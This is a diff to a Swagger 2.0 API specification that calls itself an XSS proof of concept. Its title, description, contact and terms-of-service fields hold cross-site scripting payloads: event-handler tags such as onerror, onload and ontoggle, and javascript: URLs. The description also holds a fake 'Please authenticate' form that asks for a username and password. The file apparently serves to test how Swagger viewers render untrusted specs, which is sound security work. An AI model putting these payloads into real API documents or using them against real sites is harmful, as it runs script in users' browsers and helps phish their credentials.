@@ -1,11 +1,11 @@
 {
   "swagger": "2.0",
   "info": {
-    "title": "Swagger <img/src/onerror=prompt`1`> Sample App",
-    "description": "Swagger XSS PoC <img/src/onerror=prompt`1`> click Terms of service<form method=POST><input placeholder='username'><input placeholder='password' type='password'><input type=submit>",
-    "termsOfService": "javascript:alert(document.cookie)",
+    "title": "Swagger <body onload=alert(1)> Sample App",
+    "description": "Swagger XSS PoC <details open ontoggle=prompt(1)> #Please authenticate:<br><form method=POST><br><input placeholder='username'><br><input placeholder='password' type='password'><br><input type=submit>",
+    "termsOfService": "javascript:alert(document.domain)",
     "contact": {
-      "name": "API <img/src/onerror=prompt`1`> Support",
+      "name": "API <svg onload=alert(1)> Support",
       "url": "javascript:alert(document.domain)",
       "email": "javascript:alert(document.domain)"
     },
